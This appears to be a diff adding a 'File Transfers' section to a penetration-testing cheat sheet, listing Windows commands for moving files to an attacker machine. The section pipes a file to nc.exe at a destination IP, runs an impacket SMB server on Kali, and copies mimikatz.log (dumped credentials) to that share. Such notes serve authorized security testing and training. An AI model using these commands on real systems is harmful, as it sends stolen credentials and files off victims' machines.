@@ -1,3 +1,27 @@
+# File Transfers
+
+##### File transfer from Win PowerShell (may not work)
+```powershell
+Get-Content "[FILE]" | .\nc.exe [Dest_IP] [PORT]
+```
+
+##### File transfer from Win BitsTransfer
+```powershell
+Import-Module BitsTransfer
+Start-BitsTransfer -Source [$Source] -Destination [$Destination] -Description "[Backup]" -DisplayName "[Backup]"
+```
+
+##### Files transfer from Win via SMB (works)
+```bash
+# In Kali
+impacket-smbserver test . -smb2support  -username kourosh -password kourosh
+```
+```powershell
+# In Win PS
+net use m: \\Kali_IP\test /user:kourosh kourosh
+copy mimikatz.log m:\
+```
+
 
 # VMs
 
